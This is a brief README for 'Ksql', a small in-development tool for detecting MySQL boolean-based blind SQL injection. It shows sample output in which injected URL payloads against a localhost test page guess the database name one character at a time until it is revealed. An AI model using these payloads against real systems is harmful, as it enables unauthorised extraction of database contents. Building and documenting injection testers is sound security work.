# Ksql - Blind SQL Injection

------

自己想的一种方式写出来的SQL注入检测的小工具<br>

目前还在开发中，仅增加了Mysql基于布尔类型的盲注检测功能
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="j
    I was listening to Tue Feb 21 15:31:47 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="k
    I was listening to Tue Feb 21 15:31:47 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="l
    I was listening to Tue Feb 21 15:31:47 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="m
    I was listening to Tue Feb 21 15:31:48 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="n
    I was listening to Tue Feb 21 15:31:48 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="o
    I was listening to Tue Feb 21 15:31:48 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="p
    I was listening to Tue Feb 21 15:31:48 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="q
    I was listening to Tue Feb 21 15:31:49 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="r
    I was listening to Tue Feb 21 15:31:49 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="s
    I was listening to Tue Feb 21 15:31:49 2017
    
    http://localhost/test/test.php?id=1" AND MID(DATABASE(),4,1)="t
    ================t
    database:  test
    
